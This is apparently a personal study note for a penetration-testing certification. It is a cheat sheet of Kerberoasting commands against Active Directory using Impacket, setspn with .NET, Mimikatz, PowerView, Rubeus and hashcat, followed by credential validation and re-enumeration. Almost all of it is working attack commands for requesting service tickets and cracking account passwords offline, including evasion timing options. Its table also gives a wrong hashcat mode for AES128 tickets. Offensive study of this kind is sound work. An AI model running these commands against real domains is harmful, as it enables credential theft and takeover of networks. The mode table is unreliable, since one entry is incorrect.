---
tags: [cpts, ad, kerberoasting, credential-gathering]
---

# 🔥 Kerberoasting

> [!important] Chain
> **SPN → request TGS → extract TGS-REP → crack offline (Hashcat) → validate → check privileges.**
> Requires: valid domain credentials (cleartext, NT hash, or Kerberos material).

## 🐧 Linux — Impacket

```bash
# Enumerate SPN accounts only
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER

# Request TGS for all SPN accounts
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER -request

# Request TGS for one account
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER -request-user $TARGET_USER

# Save to file
GetUserSPNs.py -dc-ip $DC_IP $DOMAIN/$USER -request-user $TARGET_USER -outputfile $TARGET_USER_tgs

# Auth with NT hash instead of password
GetUserSPNs.py -dc-ip $DC_IP -hashes $LMHASH:$NTHASH $DOMAIN/$USER -request
```

Crack:
```bash
hashcat -m 13100 $TARGET_USER_tgs $WORDLIST
```

Validate:
```bash
sudo crackmapexec smb $DC_IP -u $TARGET_USER -p $CRACKED_PASS
```

---

## 🪟 Windows — Level 1: Semi-manual (setspn + .NET + Mimikatz)

```cmd
setspn.exe -Q */*
setspn.exe -T $DOMAIN -Q */*
```

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$SPN"

# Request tickets for every discovered SPN in one pass
setspn.exe -T $DOMAIN -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Extract with Mimikatz → see [[Mimikatz]] (`kerberos::list /export`), then:
```bash
python2.7 kirbi2john.py $TARGET_USER.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > $TARGET_USER_tgs_hashcat
hashcat -m 13100 $TARGET_USER_tgs_hashcat $WORDLIST
```

---

## 🪟 Windows — Level 2: PowerView

```powershell
Import-Module .\PowerView.ps1

# List SPN accounts
Get-DomainUser * -spn | select samaccountname

# Target one user, direct Hashcat format
Get-DomainUser -Identity $TARGET_USER | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ascii .\hash.txt

# All SPN accounts to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

---

## 🪟 Windows — Level 3: Rubeus (see also [[Rubeus]])

```powershell
.\Rubeus.exe kerberoast /stats                                  # enumerate only, no tickets requested
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap       # privileged accounts only
.\Rubeus.exe kerberoast /user:$TARGET_USER /nowrap
.\Rubeus.exe kerberoast /spn:"$SPN"
.\Rubeus.exe kerberoast /domain:$DOMAIN /dc:$DC_IP /outfile:hashes.txt
.\Rubeus.exe kerberoast /simple
.\Rubeus.exe kerberoast /creduser:$DOMAIN\$USER /credpassword:$PASS
.\Rubeus.exe kerberoast /ticket:$BASE64_OR_KIRBI
.\Rubeus.exe kerberoast /usetgtdeleg
.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5
.\Rubeus.exe kerberoast /delay:5000 /jitter:30                   # opsec timing
.\Rubeus.exe kerberoast /aes
```

Check supported encryption types:
```powershell
Get-DomainUser $TARGET_USER -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

---

## 💥 Cracking by Encryption Type

| EType | Hash prefix | Hashcat mode |
|---|---|---|
| RC4-HMAC (23) | `$krb5tgs$23$*` | `-m 13100` |
| AES128 (17) | `$krb5tgs$17$*` | `-m 19700` (shared AES256 mode family) |
| AES256 (18) | `$krb5tgs$18$*` | `-m 19700` |

```bash
hashcat -m 13100 $HASH_FILE $WORDLIST     # RC4
hashcat -m 19700 $HASH_FILE $WORDLIST     # AES256
```

> [!note] `/tgtdeleg` RC4 downgrade only works reliably against Server 2016 or earlier DCs; Server 2019 returns the account's highest supported etype.

---

## ✅ Post-crack

```bash
sudo crackmapexec smb $DC_IP -u $TARGET_USER -p $CRACKED_PASS
```
Then re-enumerate: SMB / MSSQL / WinRM / RDP / LDAP with the new credential — treat as a fresh credential set across the whole environment.

#kerberoasting #cpts
